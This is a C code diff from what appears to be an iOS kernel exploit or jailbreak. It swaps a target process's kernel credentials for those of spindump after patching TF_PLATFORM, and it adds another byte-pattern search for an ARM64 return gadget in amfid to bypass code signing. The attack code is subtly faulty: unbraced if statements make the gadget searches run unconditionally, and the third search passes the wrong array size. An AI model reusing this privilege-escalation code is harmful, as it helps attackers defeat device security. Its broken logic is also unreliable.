@@ -47,6 +47,7 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
     pid_t spindump_pid = 0;
     kptr_t spindump_proc_cred = KPTR_NULL;
     printf("Swapping spindump credentials with 0x%llx...\n", target_proc);
+    printf("-> Spindump:\t%d\n", look_for_proc("/usr/sbin/spindump"));
     if(spindump_proc_cred == 0){
         spindump_pid = 0;
         if(!(spindump_pid = look_for_proc("/usr/sbin/spindump"))){
@@ -73,9 +74,9 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
         printf("-> target task:\t\t0x%llx\n", target_task);
         patch_TF_PLATFORM(target_task);
         printf("-> TF_PLATFORM patched\n");
+        myold_cred2 = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
+        if(kapi_write64(target_proc + OFFSET(proc, p_ucred), spindump_proc_cred)) printf("-> Successfully swapped spindump credentials.\n");
     }
-    myold_cred2 = kapi_read_kptr(target_proc + OFFSET(proc, p_ucred));
-    kapi_write(target_proc + OFFSET(proc, p_ucred), &spindump_proc_cred, 8);
 }
 
 
@@ -120,9 +121,20 @@ uint64_t find_amfid_OFFSET_gadget(uint8_t *amfid_macho){
         0xC0, 0x03, 0x5F, 0xD6, // ret
     };
     
+    uint64_t _bytes_gadget3[] = {
+        0x08, 0xBD, 0x48, 0xCA, // eor        x8, x8, x8, lsr #47
+        0x00, 0x7D, 0x09, 0x9B, // mul        x0, x8, x9
+        0xC0, 0x03, 0x5F, 0xD6, // ret
+    };
+    
+    printf("-> Looking for needle #1...\n");
     uint64_t find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget, sizeof(_bytes_gadget));
     if(!find_gadget)
+        printf("-> Looking for needle #2...\n");
         find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget2, sizeof(_bytes_gadget2));
+    if(!find_gadget)
+        printf("-> Looking for needle #3...\n");
+        find_gadget = (uint64_t)memmem((void*)sect_data, sect_size, &_bytes_gadget3, sizeof(_bytes_gadget2));
     if(!find_gadget){
         printf("Error in find_amfid_OFFSET_gadget(): if(!find_gadget)\n");
     }
